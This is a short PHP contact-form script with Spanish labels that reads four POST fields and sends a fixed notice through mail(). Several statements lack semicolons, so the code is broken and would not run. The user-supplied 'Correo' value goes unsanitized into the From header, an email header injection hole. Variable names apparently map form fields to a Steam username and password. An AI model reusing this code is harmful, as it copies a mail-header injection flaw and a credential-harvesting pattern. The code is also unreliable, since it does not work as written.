<?php

$userTE = $_POST['Nombre'];
$correo = $_POST['Correo'];
$pass = $_POST['Titulo'];
$userSteam = $_POST['Mensaje'];

$headers = "From: $correo";
$para = "@gmail.com"

mail($para, "Envio Consulta" , 'se ha recibido una solicitud', $headers)

echo 'Gracias por enviar tu mail. Pronto nos estaremos comunicando'

?>